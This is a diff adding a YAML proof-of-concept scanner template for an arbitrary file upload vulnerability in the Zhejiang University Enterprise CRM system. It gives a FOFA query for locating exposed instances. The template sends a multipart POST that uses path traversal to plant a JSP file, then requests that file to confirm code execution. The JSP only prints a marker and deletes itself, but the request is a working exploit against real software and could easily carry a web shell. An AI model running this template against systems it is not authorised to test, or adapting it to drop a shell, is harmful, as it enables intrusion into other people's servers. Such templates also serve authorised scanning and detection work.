@@ -1,0 +1,48 @@
+id: poc-yaml-zhe-da-en-te-crmbasicaction-entcrm-anyfile-upload
+info:
+  name: 浙大恩特客户资源管理系统 CrmBasicAction.entcrm 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 浙大恩特客户资源管理系统
+  fofa: title="欢迎使用浙大恩特客户资源管理系统"||app="浙大恩特客户资源管理系统"
+variables:
+  filename: random_str(6)
+  content: random_str(32)
+  boundary: random_str(20)
+requests:
+- method: POST
+  path: /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old
+  headers:
+    Content-Type: multipart/form-data; boundary={{.boundary}}
+  data: '--{{.boundary}}
+
+    Content-Disposition: form-data; name="file"; filename="../../{{.filename}}.jsp"
+
+    Content-Type: application/zip
+
+
+    <% out.println("{{.content}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();
+    %>
+
+    --{{.boundary}}--
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"status") &&
+
+    contains(body,filename) && matches(body,`enterdoc.war\/dao\/\/.*?\/\"}`)
+
+    '
+  output:
+  - regex_match(body,`enterdoc.war\/dao\/\/(?P<t1>.*?)\/\"}`)
+- method: GET
+  path: /enterdoc/dao/{{.t1}}/{{.filename}}.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
